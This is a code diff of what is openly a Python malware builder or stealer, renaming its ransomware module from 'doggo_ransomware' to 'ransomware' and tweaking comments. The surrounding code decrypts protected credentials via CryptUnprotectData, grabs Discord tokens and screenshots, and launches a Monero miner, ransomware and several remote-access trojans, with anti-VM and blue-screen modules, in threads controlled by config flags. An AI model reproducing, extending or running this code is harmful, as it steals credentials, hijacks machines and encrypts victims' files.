@@ -1,5 +1,3 @@
-#  Std imports
-
 import os
 import re
 import ctypes
@@ -17,9 +15,7 @@ from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wi
 from json import loads as json_loads
 from PIL import ImageGrab
 
-# Header imports
-
-from bin import xmr_miner, InjectX, rose_rat, knight_rat, block_sites, discordc, _roblox, tbsod, antivm, doggo_ransomware
+from bin import xmr_miner, InjectX, rose_rat, knight_rat, block_sites, discordc, _roblox, tbsod, antivm, ransomware
 from bin import _startup as startup
 from bin.games import get_games
 from bin.config import Config
@@ -167,6 +163,8 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
                                          byref(blob_entropy), None, None, 0x01,
                                          byref(blob_out)):
         return GetData(blob_out)
+
+# credits to lotus
 
 Tokens = ""
 dclass = discordc.DiscordX()
@@ -354,9 +352,9 @@ if cc.get_xmr_miner():
 
 if cc.get_ransomware():
     try:
-        threading.Thread(target=doggo_ransomware.ransomware()).start()
+        threading.Thread(target=ransomware.ransomware()).start()
     except Exception as e:
-        send_error_notification(e, 'Doggo Ransomware')
+        send_error_notification(e, 'Rose Ransomware')
 
 if cc.get_knight_discord_rat():
     try:
